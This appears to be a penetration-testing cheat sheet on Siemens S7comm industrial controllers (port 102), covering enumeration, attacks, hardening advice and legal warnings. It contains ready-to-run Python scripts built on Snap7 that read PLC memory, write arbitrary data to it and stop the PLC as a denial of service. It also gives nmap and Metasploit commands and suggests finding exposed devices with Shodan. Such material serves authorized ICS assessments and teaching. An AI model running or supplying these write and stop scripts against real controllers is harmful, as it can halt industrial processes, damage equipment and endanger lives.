# S7COMM ENUMERATION (Port 102/TCP)

## SERVICE OVERVIEW
```
S7comm (S7 Communication) - Siemens SCADA protocol
- Port: 102/TCP
- Siemens S7 PLC (Programmable Logic Controller) communication
- Industrial Control System (ICS) / SCADA protocol
- Used in manufacturing, utilities, critical infrastructure
- NO AUTHENTICATION by default (major security issue!)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p102 <IP>                             # Service/Version detection
nc -nv <IP> 102                                 # Manual connection (binary protocol)
```

## NMAP ENUMERATION
```bash
# S7comm detection
nmap -sV -p102 <IP>                             # Version detection
nmap -p102 --script s7-info <IP>                # S7 PLC info (if available)

# Comprehensive ICS scan
nmap -sV -p102,502,20000,44818,47808 <IP> -oA ics_scan
# 102 - S7comm (Siemens)
# 502 - Modbus
# 20000 - DNP3
# 44818 - EtherNet/IP
# 47808 - BACnet
```

## S7COMM ENUMERATION TOOLS
```bash
# Snap7 (S7 communication library)
# Install: apt-get install python-snap7
# Or: pip install python-snap7

# Python script for S7 enumeration
cat > s7_enum.py <<'EOF'
#!/usr/bin/env python3
import snap7
from snap7 import util

def enumerate_s7(ip):
    client = snap7.client.Client()
    try:
        client.connect(ip, 0, 1)  # IP, rack, slot
        if client.get_connected():
            print(f"[+] Connected to S7 PLC at {ip}")

            # Get CPU info
            cpu_info = client.get_cpu_info()
            print(f"Module Type: {cpu_info.ModuleTypeName}")
            print(f"Serial Number: {cpu_info.SerialNumber}")
            print(f"AS Name: {cpu_info.ASName}")
            print(f"Copyright: {cpu_info.Copyright}")
            print(f"Module Name: {cpu_info.ModuleName}")

            # Get CPU state
            state = client.get_cpu_state()
            print(f"CPU State: {state}")

            client.disconnect()
        else:
            print(f"[-] Connection failed")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <IP>")
        sys.exit(1)
    enumerate_s7(sys.argv[1])
EOF

python3 s7_enum.py <IP>
```

## S7COMM ATTACKS (READ/WRITE PLC)
```bash
# S7comm has NO authentication!
# Can read/write PLC memory directly

# Read PLC memory
cat > s7_read.py <<'EOF'
#!/usr/bin/env python3
import snap7
import sys

def read_plc(ip, db_number, start, size):
    client = snap7.client.Client()
    client.connect(ip, 0, 1)
    if client.get_connected():
        data = client.db_read(db_number, start, size)
        print(f"Data from DB{db_number}: {data.hex()}")
        client.disconnect()

if __name__ == "__main__":
    read_plc(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4]))
    # Usage: python3 s7_read.py <IP> <DB> <start> <size>
EOF

python3 s7_read.py <IP> 1 0 100

# Write to PLC (DANGEROUS - can affect physical processes!)
cat > s7_write.py <<'EOF'
#!/usr/bin/env python3
import snap7
import sys

def write_plc(ip, db_number, start, data):
    client = snap7.client.Client()
    client.connect(ip, 0, 1)
    if client.get_connected():
        client.db_write(db_number, start, bytearray.fromhex(data))
        print(f"[+] Written to DB{db_number}")
        client.disconnect()

if __name__ == "__main__":
    write_plc(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), sys.argv[4])
    # Usage: python3 s7_write.py <IP> <DB> <start> <hex_data>
EOF

# WARNING: Writing to PLC can cause physical damage!
# Only use in authorized testing environments
```

## PLC OPERATIONS
```bash
# S7comm allows PLC control operations:
# - Start PLC
# - Stop PLC
# - Hot restart
# - Cold restart
# - Read diagnostics
# - Upload/download programs

# Stop PLC (DoS)
cat > s7_stop.py <<'EOF'
#!/usr/bin/env python3
import snap7
import sys

def stop_plc(ip):
    client = snap7.client.Client()
    client.connect(ip, 0, 1)
    if client.get_connected():
        client.plc_stop()
        print("[!] PLC stopped!")
        client.disconnect()

if __name__ == "__main__":
    stop_plc(sys.argv[1])
EOF

# WARNING: Stopping a PLC can halt industrial processes!
# Can cause safety issues, production downtime, equipment damage
```

## METASPLOIT MODULES
```bash
msfconsole

# S7 enumeration
use auxiliary/scanner/scada/s7_enumerate
set RHOSTS <IP>
run

# Modscan (for Modbus, but sometimes useful)
use auxiliary/scanner/scada/modscan
set RHOSTS <IP>
run
```

## VULNERABILITY SCANNING
```bash
# Search for S7/SCADA exploits
searchsploit s7
searchsploit siemens
searchsploit scada

# Known vulnerabilities:
# CVE-2019-13945: Siemens S7-1200/1500 DoS
# CVE-2016-9158: Siemens S7 memory protection bypass
# CVE-2015-5374: Siemens SIMATIC S7-1200 authentication bypass
# Stuxnet (2010): Exploited S7 PLCs to sabotage centrifuges

# ICS-specific scanners
# plcscan (https://github.com/yanlinlin82/plcscan)
# s7-pcap-parser
```

## COMMON MISCONFIGURATIONS
```
☐ S7comm PLC exposed to internet (CRITICAL!)
☐ No authentication (S7comm has NONE by default)
☐ No network segmentation (PLC on corporate network)
☐ No firewall rules restricting access
☐ Outdated firmware with known vulnerabilities
☐ Default configurations not hardened
☐ No intrusion detection for ICS protocols
☐ Direct access from corporate network
☐ No monitoring of PLC operations
☐ Physical security not implemented
```

## QUICK WIN CHECKLIST
```
☐ Scan for S7comm on port 102/TCP
☐ Enumerate PLC information (model, serial, name)
☐ Read PLC CPU state and diagnostics
☐ Identify PLC firmware version
☐ Check for known vulnerabilities
☐ Read PLC memory (data blocks)
☐ Document PLC configuration
☐ DO NOT write or stop PLC without authorization!
☐ Report findings to ICS security team
☐ Recommend network segmentation and monitoring
```

## ONE-LINER ENUMERATION
```bash
# Quick S7 detection
nmap -sV -p102 <IP>

# Enumerate with Snap7 (if installed)
python3 s7_enum.py <IP>
```

## SECURITY IMPLICATIONS
```
CRITICAL RISKS:
- NO AUTHENTICATION (anyone can connect and control!)
- Read/write PLC memory (tamper with processes)
- Start/stop PLC (denial of service, safety hazard)
- Upload malicious PLC programs (Stuxnet-style attacks)
- Physical damage potential (industrial equipment)
- Safety system bypass (can cause injuries/deaths)
- Production downtime (millions in losses)
- Intellectual property theft (read PLC logic)

ATTACK SCENARIOS:
1. Reconnaissance (enumerate PLCs, read configurations)
2. Data exfiltration (steal proprietary PLC programs)
3. Sabotage (modify process parameters, cause malfunctions)
4. Denial of Service (stop PLCs, halt production)
5. Physical damage (dangerous process conditions)
6. Ransomware (encrypt PLC programs, demand payment)

REAL-WORLD EXAMPLES:
- Stuxnet (2010): Sabotaged Iranian centrifuges via S7 PLCs
- Ukraine power grid (2015): ICS attack caused blackouts
- Triton/Trisis (2017): Targeted safety systems in Saudi Arabia

CRITICAL RECOMMENDATIONS:
- NEVER expose S7comm to internet (use VPN, firewalls)
- Implement network segmentation (separate ICS network)
- Use Siemens security features (protection levels, passwords)
- Deploy ICS-specific intrusion detection (IDS/IPS)
- Regular security audits by ICS security specialists
- Physical security (locked cabinets, access control)
- Change detection (monitor for unauthorized PLC changes)
- Incident response plan for ICS incidents
- Employee training on ICS security
- Coordinate with CISA/ICS-CERT for threat intelligence
```

## ICS/SCADA SECURITY BEST PRACTICES
```
Defense in Depth for ICS:
1. Network Segmentation
   - Separate ICS network from corporate network
   - Use DMZ for HMI/SCADA servers
   - Air-gap critical PLCs if possible

2. Access Control
   - VPN for remote access (never direct internet)
   - Multi-factor authentication
   - Least privilege principle
   - Physical access controls

3. Monitoring & Detection
   - ICS-specific IDS (e.g., Claroty, Nozomi, Dragos)
   - Baseline normal PLC behavior
   - Alert on unauthorized changes
   - Log all PLC operations

4. Patch Management
   - Regular firmware updates (test in lab first!)
   - Vendor security advisories
   - Vulnerability scanning (carefully!)

5. Incident Response
   - ICS-specific IR plan
   - Coordination with physical safety team
   - Backup PLC programs (offline storage)
   - Recovery procedures
```

## TOOLS
```bash
# Snap7 (S7 communication library)
pip install python-snap7
apt-get install python-snap7

# Nmap
nmap -sV -p102 <IP>

# Metasploit
use auxiliary/scanner/scada/s7_enumerate

# plcscan (Siemens S7 scanner)
git clone https://github.com/yanlinlin82/plcscan
cd plcscan
./plcscan <IP>

# s7-python (alternative library)
pip install python-snap7

# ICS security tools
# - Wireshark (S7comm protocol dissector)
# - Digital Bond Redpoint (ICS vuln scanner)
# - Shodan (search for exposed ICS devices)
```

## LEGAL & ETHICAL WARNINGS
```
⚠️  CRITICAL WARNING ⚠️

S7comm / ICS devices control PHYSICAL PROCESSES:
- Manufacturing equipment
- Power generation/distribution
- Water treatment plants
- Chemical processing
- Transportation systems
- Building automation

UNAUTHORIZED ACCESS IS:
- ILLEGAL (Computer Fraud and Abuse Act, etc.)
- DANGEROUS (can cause injuries, deaths, explosions)
- POTENTIALLY CATASTROPHIC (environmental disasters)

DO NOT:
- Scan or access ICS devices without explicit authorization
- Write to PLCs (can cause physical damage)
- Stop PLCs (can halt critical processes)
- Upload programs (can brick PLCs or worse)
- Test on production systems

ONLY PERFORM:
- Authorized penetration tests (with signed agreement)
- Research on isolated lab equipment
- Security assessments coordinated with asset owners
- Work with ICS security professionals

REPORT VULNERABILITIES:
- CISA ICS-CERT (https://www.cisa.gov/ics-cert)
- Vendor security teams (responsible disclosure)
- Asset owner security teams

Remember: Lives may depend on these systems!
```

## DEFENSE DETECTION
```bash
# Monitor for S7comm attacks:
# - Connections to port 102 from unexpected sources
# - PLC stop/start commands
# - Memory write operations
# - Program uploads/downloads
# - Unauthorized configuration changes

# IDS signatures for S7comm
# - Snort/Suricata rules for S7comm
# - Zeek (formerly Bro) ICS protocol analyzers

# Wireshark capture (analyze S7comm traffic)
tcpdump -i eth0 -w s7comm.pcap tcp port 102
wireshark s7comm.pcap
# Filter: s7comm

# Check PLC logs (if available)
# Siemens TIA Portal → Online & Diagnostics
```

## REFERENCE - OTHER ICS PROTOCOLS
```bash
# Related ICS/SCADA ports:
102   - S7comm (Siemens)      ← THIS PORT
502   - Modbus TCP
20000 - DNP3
44818 - EtherNet/IP (Allen-Bradley)
47808 - BACnet (Building Automation)
2222  - EtherNet/IP Explicit Messaging
1911  - Niagara Fox (Tridium)

# All ICS protocols should be:
# - Isolated from internet
# - Monitored for anomalies
# - Protected with defense-in-depth
```
